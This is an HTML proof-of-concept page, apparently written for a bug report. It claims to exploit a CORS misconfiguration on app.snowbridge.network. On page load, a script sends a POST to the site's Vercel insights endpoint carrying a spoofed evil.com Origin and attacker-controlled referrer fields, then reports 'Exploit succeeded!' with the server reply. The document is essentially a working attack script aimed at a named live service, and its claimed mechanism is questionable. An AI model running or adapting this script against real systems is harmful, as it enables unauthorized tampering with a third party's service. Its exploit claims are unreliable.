<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Snowbridge CORS Misconfiguration PoC</title>
</head>
<body>
  <h2>üö® PoC ‚Äì Sensitive Data Injection via CORS Misconfiguration</h2>
  <pre id="log">Sending malicious request...</pre>

  <script>
    async function exploit() {
      try {
        const res = await fetch("https://app.snowbridge.network/_vercel/insights/view", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Origin": "https://evil.com"
          },
          body: JSON.stringify({
            o: "https://evil.com/poc",   // attacker-controlled origin
            sv: "1337",                 // fake version
            ts: Date.now(),             // custom timestamp
            r: "https://evil.com/steal" // attacker-controlled referrer
          })
        });

        const text = await res.text();
        document.getElementById("log").innerText =
          "‚úÖ Exploit succeeded!\n\nServer responded with:\n" + text;
      } catch (err) {
        document.getElementById("log").innerText =
          "‚ùå Exploit failed:\n" + err;
      }
    }

    exploit();
  </script>
</body>
</html>

